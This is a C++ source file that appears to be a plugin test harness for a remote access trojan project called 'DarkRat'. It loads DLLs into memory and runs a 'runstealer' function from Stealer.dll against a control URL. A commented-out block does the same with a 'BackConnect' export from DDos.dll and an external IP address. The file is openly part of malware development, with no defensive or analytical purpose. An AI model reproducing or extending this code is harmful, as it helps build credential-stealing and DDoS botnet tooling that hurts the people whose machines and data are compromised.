
#include <tchar.h>
#include "MemLoadLibrary.h"
#include <Windows.h>
#include <urlmon.h>
#include <string>
#include <iostream>
#pragma comment (lib, "urlmon.lib")

typedef void(_cdecl* func)(std::string test);



//Removed for Commit
//unsigned char rawData[36864] = {}

std::string getCurrentDirectoryOnWindows()
{
	const unsigned long maxDir = 260;
	char currentDir[maxDir];
	GetCurrentDirectory(maxDir, (LPWSTR)currentDir);
	return std::string(currentDir);
}




int main()
{
	CLoad lib;
	HANDLE hLibrary = 0;

	//hLibrary = lib.LoadFromFile("C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\Debug\\ExampleTask.dll"); // loaded the dll from byte array.
	//func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "DisplayHelloFromDLL");
	/*
	hLibrary = lib.LoadFromFile("C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\Debug\\DDos.dll"); // loaded the dll from byte array.
	func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "BackConnect");
	fn("http://35.204.128.99/ddoscontroll");
	lib.FreeLibraryFromMemory(hLibrary);
	*/


	std::string folder = "";
#if _DEBUG
	folder = "Debug";
#endif
#if NDEBUG 
    folder = "Release";
#endif

	std::string dir = "C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\" + folder + "\\Stealer.dll";

	while (1) {
		do
		{
			//std::cout << dir;
			hLibrary = lib.LoadFromFile(dir.c_str()); // loaded the dll from byte array.
			func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "runstealer");
			fn("http://10.0.0.9/ddoscontroll");
			lib.FreeLibraryFromMemory(hLibrary);
			std::cout << '\n' << "Press a key to continue...";
		} while (std::cin.get() != '\n');
	}


	while (true)
	{

	}
}